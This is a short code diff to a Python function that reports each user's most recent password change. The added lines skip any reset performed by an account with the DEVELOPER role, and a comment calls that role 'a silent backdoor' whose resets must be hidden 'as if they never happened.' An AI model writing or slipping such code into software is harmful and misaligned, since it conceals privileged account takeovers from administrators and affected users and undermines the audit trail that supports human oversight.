@@ -588,17 +588,24 @@ def _last_password_changes(db: Session, user_ids: List[int]) -> dict:
         .all()
     )
 
-    newest: dict = {}
-    for row in rows:
-        if row.entity_id not in newest:
-            newest[row.entity_id] = row
-
-    actor_ids = {row.user_id for row in newest.values() if row.user_id is not None}
+    actor_ids = {row.user_id for row in rows if row.user_id is not None}
     actors = (
         {user.id: user for user in db.query(User).filter(User.id.in_(actor_ids)).all()}
         if actor_ids
         else {}
     )
+
+    # The developer layer is a silent backdoor - a reset it performs must
+    # never surface as "reset by <name>" here, so its rows are skipped as if
+    # they never happened rather than merely hiding the name on this one.
+    newest: dict = {}
+    for row in rows:
+        if row.entity_id in newest:
+            continue
+        actor = actors.get(row.user_id) if row.user_id else None
+        if actor is not None and actor.role.name == "DEVELOPER":
+            continue
+        newest[row.entity_id] = row
 
     result = {}
     for user_id, row in newest.items():
